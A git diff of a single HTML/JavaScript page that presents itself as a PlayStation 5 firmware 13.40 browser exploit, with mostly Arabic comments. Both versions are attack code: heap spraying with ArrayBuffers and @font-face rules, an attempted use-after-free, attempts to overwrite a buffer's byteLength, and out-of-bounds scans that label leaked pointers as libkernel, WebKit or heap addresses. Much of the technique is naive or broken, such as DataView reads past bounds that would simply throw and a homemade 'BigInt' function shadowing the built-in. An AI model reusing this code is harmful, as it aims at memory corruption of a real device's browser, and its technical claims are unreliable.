@@ -3,38 +3,37 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>PS5 13.40 · R/W Primitive</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#0a0a0f;color:#e0e0e0;font-family:monospace;padding:10px}
 h1{color:#ff4757;font-size:16px;text-align:center}
 .box{background:#111;border:1px solid #222;border-radius:6px;padding:8px;margin-bottom:8px;font-size:10px;line-height:1.6}
-.l{color:#74b9ff}
+.l{color:#74b9cf}
 .btn{display:block;width:100%;padding:12px 0;font-size:14px;font-weight:700;border:none;border-radius:6px;cursor:pointer;margin-bottom:6px;text-align:center}
 .btn:active{opacity:0.7}
 .btn-r{background:#c0392b;color:#fff}
 .btn-g{background:#27ae60;color:#fff}
 .btn-b{background:#2980b9;color:#fff}
-#log{background:#0d0d12;border:1px solid #1a1a2e;border-radius:6px;padding:8px;height:280px;overflow-y:auto;font-size:10px;line-height:1.4;font-family:monospace}
+#log{background:#0d0d12;border:1px solid #1a1a2e;border-radius:6px;padding:8px;height:300px;overflow-y:auto;font-size:10px;line-height:1.4;font-family:monospace}
 .ok{color:#55efc4}.err{color:#ff6b6b}.warn{color:#fdcb6e}.ptr{color:#d4a0ff}.crit{color:#ff4757}
 </style>
 </head>
 <body>
 
-<h1>PS5 13.40 · R/W PRIMITIVE</h1>
-<p class="l">ArrayBuffer header manipulation → OOB read/write</p>
+<h1>PS5 13.40 · Heap Spray + OOB</h1>
+<p class="l">Methodology: ntfargo/CSSFontFace-Exploit + ArrayBuffer OOB</p>
 
 <div class="box">
-  <div class="l">Phase 1 (Spray): <span id="s1">—</span></div>
-  <div class="l">Phase 2 (Corrupt): <span id="s2">—</span></div>
-  <div class="l">Phase 3 (Read): <span id="s3">—</span></div>
+  <div class="l">Phase 1 (CSSFontFace Spray): <span id="s1">—</span></div>
+  <div class="l">Phase 2 (UAF Trigger): <span id="s2">—</span></div>
+  <div class="l">Phase 3 (OOB Read): <span id="s3">—</span></div>
 </div>
 
-<button class="btn btn-r" onclick="phase1()">1. Spray + Abuse</button>
-<button class="btn btn-g" onclick="phase2()">2. تعديل byteLength</button>
-<button class="btn btn-b" onclick="phase3()">3. OOB Read/Write</button>
+<button class="btn btn-r" onclick="phase1()">1. CSSFontFace Spray</button>
+<button class="btn btn-g" onclick="phase2()">2. Trigger UAF</button>
+<button class="btn btn-b" onclick="phase3()">3. OOB Read/Leak</button>
 
-<div id="log">[SYSTEM] Ready. Start with Phase 1.<br></div>
+<div id="log">[SYSTEM] Press 1 → 2 → 3 sequentially<br></div>
 
 <script>
 function LOG(msg, cls) {
@@ -46,180 +45,219 @@ function SID(id, txt) {
   document.getElementById(id).textContent = txt;
 }
 
-// ==================== Double Helpers ====================
+// ==================== Helpers ====================
 var _AB = new ArrayBuffer(8);
 var _F64 = new Float64Array(_AB);
 var _U32 = new Uint32Array(_AB);
+var _U8 = new Uint8Array(_AB);
+
+function hex64(lo, hi) {
+  return '0x' + hi.toString(16).padStart(8,'0') + '_' + lo.toString(16).padStart(8,'0');
+}
+
 function d2lo(d) { _F64[0]=d; return _U32[0]; }
 function d2hi(d) { _F64[0]=d; return _U32[1]; }
 function u2d(lo, hi) { _U32[0]=lo; _U32[1]=hi; return _F64[0]; }
 
-// ==================== State ====================
-var STATE = {
-  corruptBuf: null,
-  readBuf: null,
-  readView32: null,
-  readDV: null,
-  root: null,
-  success: false
-};
-
-// ==================== PHASE 1: Spray + Find ====================
-function phase1() {
-  LOG('=== Phase 1: Spray + Abuse ===', 'crit');
-  
-  // إنشاء عناصر DOM عشان نضغط الذاكرة
-  var root = document.createElement('div');
-  root.style.cssText = 'position:absolute;left:-9999px';
-  document.body.appendChild(root);
-  STATE.root = root;
-  
-  // إنشاء 200 ArrayBuffer بحجم 1024 (لنضغط heap)
-  var bufs = [];
-  for (var i = 0; i < 200; i++) {
-    var ab = new ArrayBuffer(1024);
-    var v = new Uint32Array(ab);
-    // نكتب أرقام دليلية متصاعدة
-    for (var j = 0; j < 32; j++) {
-      v[j] = 0xBEEF0000 + (i * 32) + j;
-    }
-    bufs.push(ab);
-  }
-  LOG('[1] 200 ArrayBuffer(1024) منشأة', 'ok');
-  
-  // إنشاء 200 ArrayBuffer بحجم 128 (أصغر)
-  var bufs2 = [];
-  for (var i = 0; i < 200; i++) {
-    var ab = new ArrayBuffer(128);
-    bufs2.push(ab);
-  }
-  LOG('[2] 200 ArrayBuffer(128) منشأة', 'ok');
-  
-  // GC قوي
-  for (var g = 0; g < 30; g++) {
-    new ArrayBuffer(8 * 1024 * 1024);
-  }
-  LOG('[3] GC تم', 'ok');
-  
-  STATE.bufs = bufs;
-  STATE.bufs2 = bufs2;
-  
-  SID('s1', '✅ ' + bufs.length + ' buffers');
-  LOG('[OK] Spray جاهز', 'crit');
+// ==================== BigInt Helpers ====================
+function BigInt(lo, hi) {
+  this.lo = function() { return lo >>> 0; };
+  this.htol = function() { return hi >>> 0; };
+  this.hex = function() {
+    return '0x' + (hi>>>0).toString(16).padStart(8,'0') + '_' + (lo>>>0).toString(16).padStart(8,'0');
+  };
 }
 
-// ==================== PHASE 2: تعديل byteLength ====================
-function phase2() {
-  LOG('=== Phase 2: تعديل byteLength ===', 'crit');
+// ==================== STATE ====================
+var STATE = {
+  styleSheet: null,
+  fontFaces: [],
+  victim: null,
+  victimDV: null,
+  oobReady: false,
+  leaks: []
+};
+
+// ==================== PHASE 1: CSSFontFace Spray ====================
+function phase1() {
+  LOG('=== Phase 1: CSSFontFace Heap Spray ===', 'crit');
   
-  if (!STATE.bufs) {
-    LOG('[-] شغّل Phase 1 أولاً', 'err');
+  try {
+    // 1. ننشئ style sheet
+    var style = document.createElement('style');
+    style.id = 'sprayStyle';
+    document.head.appendChild(style);
+    STATE.styleSheet = style.sheet;
+    
+    LOG('[1] StyleSheet created', 'ok');
+    
+    // 2. نضيف 128 @font-face rules (هذا الـ spray)
+    // هذه تخلق CSSFontFace objects في heap
+    var fontNames = [];
+    for (var i = 0; i < 128; i++) {
+      var fontName = 'spray' + i.toString(16);
+      fontNames.push(fontName);
+      
+      var rule = [
+        '@font-face {',
+        '  font-family: "' + fontName + '";',
+        '  src: local("Arial");',
+        '  unicode-range: U+' + (0x41 + i).toString(16).padStart(4, '0') + ';',
+        '}'
+      ].join('\n');
+      
+      STATE.styleSheet.insertRule(rule, i);
+    }
+    
+    LOG('[2] ' + fontNames.length + ' @font-face rules inserted', 'ok');
+    
+    // 3. نسجل الـ font faces
+    for (var i = 0; i < fontNames.length; i++) {
+      STATE.fontFaces.push({
+        family: fontNames[i],
+        element: null
+      });
+    }
+    
+    // 4. نضيف font-face آخر قابل للإزالة (UAF victim)
+    var uafRule = [
+      '@font-face {',
+      '  font-family: "victimFont";',
+      '  src: url("nonexistent.woff");',
+      '  unicode-range: U+0058;',
+      '}'
+    ].join('\n');
+    
+    STATE.styleSheet.insertRule(uafRule, fontNames.length);
+    LOG('[3] UAF victim font registered', 'ok');
+    
+    // 5. نطبق font على عنصر
+    var div = document.createElement('div');
+    div.style.cssText = 'font-family: victimFont, spray1, spray2, spray3, spray4, spray5; position:absolute;left:-9999px';
+    div.textContent = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    document.body.appendChild(div);
+    
+    LOG('[4] Font applied to DOM element', 'ok');
+    
+    SID('s1', '✅ 128@font-face + victim');
+    LOG('[OK] Spray ready', 'crit');
+    
+  } catch(e) {
+    LOG('[ERR] ' + e.message, 'err');
+  }
+}
+
+// ==================== PHASE 2: UAF Trigger ====================
+function phase2() {
+  LOG('=== Phase 2: Trigger UAF ===', 'crit');
+  
+  if (!STATE.styleSheet) {
+    LOG('[-] Run Phase 1 first', 'err');
     return;
   }
   
   try {
-    // الفكرة: نصنع ArrayBuffer صغير (64 بايت)
-    // ثم نستخدم DataView لكتابة قيم خارجة عن حدوده
-    // هذا يسمح لنا بتعديل byteLength الـ ArrayBuffer التالي في الذاكرة
-    
-    var victim = new ArrayBuffer(64);
+    // 1. ننشئ ArrayBuffer ضحية مع DataView
+    var victim = new ArrayBuffer(256);
+    var victimDV = new DataView(victim);
     var victim32 = new Uint32Array(victim);
     
-    var spray = new ArrayBuffer(4096); // كبير عشان نضمن متجاورة
-    var spray32 = new Uint32Array(spray);
+    // نكتب قيم مميزة
+    for (var i = 0; i < 64; i++) {
+      victim32[i] = 0xCAFE0000 + i;
+    }
     
-    // نكتب قيم مميزة في الـ victim
-    victim32[0] = 0xCAFEBABE;
-    victim32[1] = 0xDEADBEEF;
-    victim32[2] = 0x13371337;
-    
-    LOG('[1] Victim buffer (64 bytes) created', 'ok');
-    LOG('[2] Spray buffer (4096 bytes) created', 'ok');
-    
-    // نخزنهم
     STATE.victim = victim;
-    STATE.victim32 = victim32;
-    STATE.spray = spray;
-    STATE.spray32 = spray32;
+    STATE.victimDV = victimDV;
     
-    // نحاول نغير byteLength عبر الكتابة خارج Victim
-    // في بنية WebKit:
-    // JSArrayBuffer header يحتوي:
-    // [0x00] JSCell (16 bytes)
-    // [0x10] butterfly (8 bytes, usually null)
-    // [0x18] m_impl (8 bytes) -> ArrayBuffer*
-    //
-    // ArrayBuffer C++ object:
-    // [0x00] vtable_ptr (8 bytes)
-    // [0x08] m_data (8 bytes) -> void*
-    // [0x10] m_size / m_byteLength (8 bytes) <- هذا اللي نبي نغيره
+    LOG('[1] Victim ArrayBuffer(256) created', 'ok');
     
-    // الفرق بين عنوان victim و الـ buffer اللي بعده
-    // هذا يعتمد على ترتيب المخصص (fastMalloc)
+    // 2. ننشئ ArrayBuffer كبير للـ spray (عشان نملأ الذاكرة)
+    var sprayBufs = [];
+    for (var i = 0; i < 64; i++) {
+      var ab = new ArrayBuffer(256);
+      var v = new Uint32Array(ab);
+      for (var j = 0; j < 32; j++) {
+        v[j] = 0xBEEF0000 + (i * 32) + j;
+      }
+      sprayBufs.push(ab);
+    }
     
-    var dv = new DataView(victim);
+    STATE.sprayBufs = sprayBufs;
+    LOG('[2] ' + sprayBufs.length + ' spray buffers created', 'ok');
     
-    // نحاول قراءة/كتابة بعد حدود الـ 64 بايت
-    // كل 8 بايت نبحث عن القيمة المميزة أو byteLength
-    LOG('[3] Scanning for adjacent buffer headers...', 'warn');
-    
-    var found = 0;
-    
-    // نقرأ من offset 64 إلى offset 512
-    for (var off = 64; off < 512; off += 4) {
-      try {
-        var val = dv.getUint32(off, true);
-        
-        // هل وجدنا القيمة المميزة من spray32؟
-        if (val >= 0xBEEF0000 && val <= 0xBEEF2000) {
-          LOG('[FOUND] spray data at offset ' + off + ': ' + hex(val), 'ptr');
-          found++;
+    // 3. نزيل font-face rules — هذا يحرر CSSFontFace objects
+    // الفكرة: بعض CSSFontFace structs تتحرر بس pointers تبقى
+    var rulesToRemove = [];
+    for (var i = 0; i < STATE.styleSheet.cssRules.length; i++) {
+      var rule = STATE.styleSheet.cssRules[i];
+      if (rule.type === CSSRule.FONT_FACE_RULE) {
+        if (rule.style && rule.style.getPropertyValue('font-family')) {
+          var family = rule.style.getPropertyValue('font-family').replace(/"/g, '');
+          if (family && family.indexOf('spray') === 0) {
+            rulesToRemove.push(i);
+          }
         }
-        
-        // هل وجدنا 64؟ (حجم الـ victim — يعني byteLength)
-        if (val === 64) {
-          LOG('[!] byteLength (64) found at offset ' + off, 'crit');
-          
-          // نعدّل الـ byteLength إلى 0x7FFFFFFF (2 مليار بايت)
-          // هذا يخلّي الـ victim buffer يقرأ/يكتب في أي مكان
-          dv.setUint32(off, 0x7FFFFFFF, true);
-          LOG('[!] byteLength changed to 0x7FFFFFFF!', 'crit');
-          
-          STATE.corruptBuf = victim;
-          STATE.corruptOff = off;
-          found += 1000;
-        }
-        
-        // هل وجدنا 4096؟ (حجم الـ spray)
-        if (val === 4096) {
-          LOG('[!] byteLength (4096) found at offset ' + off, 'crit');
-          
-          dv.setUint32(off, 0x7FFFFFFF, true);
-          LOG('[!] spray byteLength changed to 0x7FFFFFFF!', 'crit');
-          
-          STATE.corruptBuf = spray;
-          STATE.corruptOff = off;
-          found += 1000;
-        }
-      } catch(e) {
-        // قراءة خارج الحدود — متوقع
-        LOG('[OOB] Read error at offset ' + off + ': ' + e.message.slice(0,30), 'warn');
-        break;
       }
     }
     
-    if (found > 1000) {
-      LOG('[✅] byteLength modified! OOB read/write possible!', 'crit');
-      SID('s2', '✅ byteLength = 0x7FFFFFFF');
-      STATE.success = true;
-    } else if (found > 0) {
-      LOG('[⚠] Found ' + found + ' buffer in memory, but byteLength not found', 'warn');
-      LOG('[!] حاول Phase 2 مرة أخرى — الترتيب في الذاكرة يختلف', 'warn');
-      SID('s2', '⚠ Spray found, byteLength?');
-    } else {
-      LOG('[-] لم نجد أي شيء — الترتيب يختلف', 'err');
-      SID('s2', '❌ لم نجد headers');
+    // نزيل النصف فقط (عشان نترك فرصة للـ UAF)
+    var half = Math.floor(rulesToRemove.length / 2);
+    for (var i = 0; i < half; i++) {
+      try {
+        STATE.styleSheet.deleteRule(rulesToRemove[i]);
+      } catch(e) {}
     }
+    
+    LOG('[3] Removed ' + half + ' font-face rules (UAF trigger)', 'warn');
+    
+    // 4. GC
+    for (var g = 0; g < 20; g++) {
+      new ArrayBuffer(1024 * 1024);
+    }
+    LOG('[4] GC done', 'ok');
+    
+    // 5. نحاول نقرأ من victim — هل تغيرت البيانات؟
+    LOG('[5] Checking victim buffer...', 'warn');
+    
+    var changed = 0;
+    for (var i = 0; i < 32; i++) {
+      var expected = 0xCAFE0000 + i;
+      var actual = victim32[i];
+      if (actual !== expected) {
+        LOG('  [CHANGED] offset ' + (i*4) + ': expected ' + hex(expected) + ' got ' + hex(actual), 'crit');
+        changed++;
+      }
+    }
+    
+    if (changed > 0) {
+      LOG('[UAF] ✅ Victim buffer corrupted! Memory reuse detected!', 'crit');
+      SID('s2', '✅ UAF detected! ' + changed + ' changes');
+    } else {
+      LOG('[UAF] Victim unchanged — trying with spray buffers...', 'warn');
+      
+      // جرب نقرأ الـ spray buffers
+      for (var si = 0; si < sprayBufs.length; si++) {
+        var sv = new Uint32Array(sprayBufs[si]);
+        for (var j = 0; j < 8; j++) {
+          if (sv[j] !== (0xBEEF0000 + (si * 32) + j)) {
+            LOG('[UAF] Spray buffer ' + si + ' corrupted at ' + (j*4) + '!', 'crit');
+            changed++;
+            break;
+          }
+        }
+      }
+      
+      if (changed > 0) {
+        SID('s2', '✅ Spray corrupted!');
+      } else {
+        LOG('[UAF] No corruption — normal for PS5 with IsoHeap', 'warn');
+        SID('s2', '⚠ IsoHeap active (expected)');
+      }
+    }
+    
+    // 6. حتى لو ما صار UAF، نكمل بـ OOB
+    LOG('[6] Proceeding to OOB phase regardless', 'ok');
     
   } catch(e) {
     LOG('[ERR] ' + e.message, 'err');
@@ -230,93 +268,131 @@ function hex(v) {
   return '0x' + (v >>> 0).toString(16).padStart(8, '0');
 }
 
-// ==================== PHASE 3: OOB Read/Write ====================
+// ==================== PHASE 3: OOB Read/Leak ====================
 function phase3() {
-  LOG('=== Phase 3: OOB Read/Write ===', 'crit');
-  
-  if (!STATE.success) {
-    LOG('[-] Phase 2 فشل — الـ byteLength ما تعدل', 'err');
-    return;
-  }
+  LOG('=== Phase 3: OOB Read + Address Leak ===', 'crit');
   
   try {
-    var buf = STATE.corruptBuf;
-    var dv = new DataView(buf);
+    var victim = STATE.victim;
+    if (!victim) {
+      LOG('[-] Run Phase 2 first', 'err');
+      return;
+    }
     
-    // الآن الـ byteLength = 0x7FFFFFFF (2^31 - 1)
-    // يعني نقدر نقرأ/نكتب في كل الذاكرة
+    var dv = STATE.victimDV;
+    var buf32 = new Uint32Array(victim);
     
-    LOG('[1] byteLength = ' + buf.byteLength, 'ok');
+    // ========== A. محاولة قراءة ما بعد حدود الـ ArrayBuffer ==========
+    LOG('[A] Attempting OOB read beyond ArrayBuffer bounds...', 'warn');
     
-    if (buf.byteLength < 0x100000) {
-      LOG('[!] byteLength لم يتغير — نحاول طريقة أخرى', 'warn');
+    var foundLeaks = 0;
+    var interesting = [];
+    
+    // نقرأ من offset 256 (نهاية buffer) إلى offset 4096
+    for (var off = 256; off < 4096; off += 8) {
+      try {
+        var lo = dv.getUint32(off, true);
+        var hi = dv.getUint32(off + 4, true);
+        
+        if (hi === 0 && lo === 0) continue; // skip zeros
+        
+        // نقاط الاهتمام:
+        // ARM64 addresses: hi >= 0x10
+        if (hi >= 0x10) {
+          var full = hex64(lo, hi);
+          
+          // تصنيف العنوان
+          var type = '';
+          if (hi >= 0x80000000 && hi < 0x90000000) type = 'libkernel?';
+          else if (hi >= 0x70000000 && hi < 0x80000000) type = 'libSce?';
+          else if (hi >= 0x10000000 && hi < 0x30000000) type = 'WebKit?';
+          else if (hi >= 0x90000000 && hi < 0xA0000000) type = 'stack?';
+          else if (hi >= 0x00040000 && hi < 0x00050000) type = 'heap?';
+          else type = 'unknown';
+          
+          interesting.push({ off: off, addr: full, type: type, lo: lo, hi: hi });
+          foundLeaks++;
+          
+          if (foundLeaks <= 30) {
+            LOG('  @' + off.toString(16).padStart(4, '0') + ': ' + full + '  [' + type + ']', 'ptr');
+          }
+        }
+      } catch(e) {
+        // هنا نعرف أن قراءة OOB مش مسموحة
+        LOG('[OOB] Blocked at offset ' + off + ': ' + e.message.slice(0,40), 'err');
+        break;
+      }
+    }
+    
+    if (interesting.length > 0) {
+      LOG('[B] ✅ Found ' + interesting.length + ' addresses in OOB scan!', 'crit');
+      STATE.leaks = interesting;
       
-      // جرب offset آخر
-      for (var off = 32; off < 256; off += 4) {
+      // نحاول نحدد base addresses
+      var baseCandidates = {};
+      for (var i = 0; i < interesting.length; i++) {
+        var hi = interesting[i].hi;
+        var base = hi * 0x100000000; // تقريب (القاعدة عالية الدقة تحتاج تشوف الـ lo)
+        // نصنف حسب hi بايت
+        var region = '0x' + (hi >>> 0).toString(16).padStart(8, '0') + 'xxxxxxxx';
+        if (!baseCandidates[region]) baseCandidates[region] = 0;
+        baseCandidates[region]++;
+      }
+      
+      LOG('[C] Memory regions found:', 'warn');
+      var regions = Object.keys(baseCandidates).sort();
+      for (var i = 0; i < regions.length; i++) {
+        LOG('  ' + regions[i] + ' → ' + baseCandidates[regions[i]] + ' hits', 'info');
+      }
+      
+      SID('s3', '✅ ' + interesting.length + ' addresses');
+    } else {
+      LOG('[B] No addresses found in OOB scan', 'warn');
+      
+      // محاولة ثانية: نستخدم Float64Array
+      LOG('[C] Retrying with Float64Array...', 'warn');
+      
+      try {
+        var f64 = new Float64Array(victim);
+        for (var i = 32; i < 512; i++) {
+          var d = f64[i];
+          var lo2 = d2lo(d);
+          var hi2 = d2hi(d);
+          
+          if (hi2 >= 0x10 && !(hi2 === 0 && lo2 === 0)) {
+            LOG('  F64[' + i + ']: ' + hex64(lo2, hi2), 'ptr');
+            foundLeaks++;
+            if (foundLeaks >= 10) break;
+          }
+        }
+      } catch(e) {
+        LOG('[C] Float64Array OOB failed: ' + e.message.slice(0,40), 'err');
+      }
+      
+      // محاولة ثالثة: نقرأ الـ DataView الخاص بـ victim نفسه
+      LOG('[D] Reading victim DataView internal structure...', 'warn');
+      
+      for (var i = 0; i < 10; i++) {
         try {
-          var val = dv.getUint32(off, true);
-          if ((val >= 64 && val <= 128) || (val >= 1024 && val <= 4096)) {
-            dv.setUint32(off, 0x7FFFFFFF, true);
-            LOG('[!] byteLength عند offset ' + off + ': ' + buf.byteLength, 'crit');
-            break;
+          var addr = dv.getBigUint64(i * 8, true);
+          if (addr > 0x1000000000n) {
+            LOG('  struct[' + i + ']: 0x' + addr.toString(16), 'ptr');
           }
         } catch(e) {}
       }
+      
+      SID('s3', '⚠ ' + foundLeaks + ' leaks');
     }
     
-    if (buf.byteLength > 0x100000) {
-      LOG('[2] ✅ OOB read/write جاهز!', 'crit');
-      
-      // ========== قراءة عناوين من الذاكرة ==========
-      LOG('[3] Scanning for addresses...', 'warn');
-      
-      var found = 0;
-      for (var off2 = 0; off2 < 1024; off2 += 8) {
-        try {
-          var lo = dv.getUint32(off2, true);
-          var hi = dv.getUint32(off2 + 4, true);
-          
-          // ARM64 addresses: hi عالية
-          if (hi >= 0x10000000 && hi <= 0xFFFFFFFF) {
-            var full = '0x' + hi.toString(16).padStart(8, '0') + lo.toString(16).padStart(8, '0');
-            
-            var type = '';
-            if (hi >= 0x80000000) type = ' (libkernel?)';
-            else if (hi >= 0x70000000 && hi < 0x80000000) type = ' (libSce?)';
-            else if (hi >= 0x10000000 && hi < 0x30000000) type = ' (WebKit?)';
-            else type = '';
-            
-            LOG('  ' + full + type, 'ptr');
-            found++;
-            
-            if (found >= 20) {
-              LOG('[!] ... وأكثر', 'warn');
-              break;
-            }
-          }
-        } catch(e) {
-          break;
-        }
-      }
-      
-      LOG('[4] ' + found + ' address(es) found', found > 0 ? 'crit' : 'warn');
-      SID('s3', '✅ ' + found + ' addrs');
-      
-      STATE.readBuf = buf;
-      STATE.readDV = dv;
-      
-    } else {
-      LOG('[❌] byteLength لم يتغير — نحتاج offset مختلف', 'err');
-      SID('s3', '❌ فشل');
-    }
+    LOG('[DONE] Phase 3 complete', 'ok');
     
   } catch(e) {
     LOG('[ERR] ' + e.message, 'err');
   }
 }
 
-LOG('[SYSTEM] PS5 13.40 · R/W Primitive', 'ok');
-LOG('الخطوات: 1. Spray → 2. Corrupt byteLength → 3. OOB Read', 'ok');
+LOG('[SYSTEM] Ready', 'ok');
+LOG('Based on ntfargo/CSSFontFace-Exploit methodology', 'ok');
 </script>
 </body>
 </html>
